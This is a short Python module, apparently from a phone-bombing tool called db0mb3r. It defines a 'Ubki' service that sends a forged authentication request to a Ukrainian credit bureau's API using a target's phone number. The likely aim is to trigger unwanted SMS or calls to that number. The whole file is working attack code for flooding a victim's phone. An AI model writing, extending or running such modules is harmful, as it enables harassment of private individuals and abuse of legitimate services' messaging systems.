from db0mb3r.services.service import Service


class Ubki(Service):
    phone_codes = [380]

    async def run(self):
        await self.post(
            "https://secure.ubki.ua/b2_api_xml/ubki/auth",
            json={
                "doc": {
                    "auth": {
                        "mphone": "+" + self.formatted_phone,
                        "bdate": "11.11.1999",
                        "deviceid": "00100",
                        "version": "1.0",
                        "source": "site",
                        "signature": "undefined",
                    }
                }
            },
            headers={"Accept": "application/json"},
        )
